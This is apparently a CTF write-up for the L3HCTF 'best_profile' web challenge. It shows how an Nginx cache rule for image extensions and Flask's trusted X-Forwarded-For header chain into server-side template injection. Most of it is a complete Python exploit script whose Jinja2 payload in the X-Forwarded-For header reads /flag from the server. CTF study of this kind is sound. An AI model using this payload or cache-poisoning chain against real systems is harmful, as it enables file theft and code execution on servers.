---
title: "L3HCTF best_profile: Nginx Caching and Flask ProxyFix"
description: "Review L3HCTF best_profile, tracing Nginx cache configuration and Flask ProxyFix through cache poisoning and template injection."
date: 2024-01-15T00:00:00.000Z
tags:
  - "CTF"
  - "Web Security"
  - "Flask"
  - "Nginx"
authors:
  - "bx"
draft: false
slug: "k8x9w2m7-en"
lang: "en"
translationKey: "k8x9w2m7"
---

![PixPin_2026-04-19_13-41-14](/blog/l3hctf-best-profile/01-profile-bypass-flow.png)

## L3Hctf-best_profile

### best_profile

> oops, it’s my profile

The main focus is the interaction between Nginx's caching mechanism and Flask ProxyFix.

Code audit in app.py:

```py
@app.after_request
def set_last_ip(response):
    if current_user.is_authenticated:
        current_user.last_ip = request.remote_addr  # 从X-Forwarded-For获取
        db.session.commit()
    return response

@app.route("/ip_detail/<string:username>", methods=["GET"])
def route_ip_detail(username):
    res = requests.get(f"http://127.0.0.1/get_last_ip/{username}")  # 内部请求
    last_ip = res.text  # 获取完整HTML响应
    template = f"""
    <h1>IP Detail</h1>
    <div>{last_ip}</div>    <!-- 直接插入用户可控内容 -->
    <p>Country:{country}</p>
    """
    return render_template_string(template)  # SSTI触发点
```

The Nginx configuration can also be exploited for Nginx cache poisoning.

```python
location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
    proxy_pass http://127.0.0.1:5000;
    proxy_cache static;
    proxy_cache_valid 200 302 30d;  # 缓存30天！
}
```

During login, submit an SSTI payload, then visit /get_last_ip/test.jpg to trigger the Nginx cache.

Using cache poisoning: visit /ip_detail/test.jpg, and Flask retrieves data from the poisoned cache.

The specific payload is as follows:

```python
import requests

def main():
    username = "bx.jpg"
    base_url = "http://61.147.171.103:64936"
    password = "123456"
    
    session = requests.Session()
    
    headers = {
        "X-Forwarded-For": "{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__.__builtins__.open(chr(47)+dict(flag=a)|first|lower).read()}}"
    }
    
    registration_data = {
        "username": username,
        "password": password,
        "bio": "bx",
        "submit": "Sign Up"
    }
    
    login_data = {
        "username": username,
        "password": password,
        "submit": "Log In"
    }
    
    try:
        print("=== Registration ===")
        register_response = session.post(f"{base_url}/register", data=registration_data)
        print(register_response.text)
        
        print("\n=== Login ===")
        login_response = session.post(f"{base_url}/login", headers=headers, data=login_data)
        print(login_response.text)
        
        print("\n=== Last IP ===")
        last_ip_response = session.get(f"{base_url}/get_last_ip/{username}")
        print(last_ip_response.text)
        
        print("\n=== IP Details ===")
        ip_detail_response = session.get(f"{base_url}/ip_detail/{username}")
        print(ip_detail_response.text)
        
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()
    
```

Result:

![image-20250712133846167](/blog/l3hctf-best-profile/02-flag-result.png)

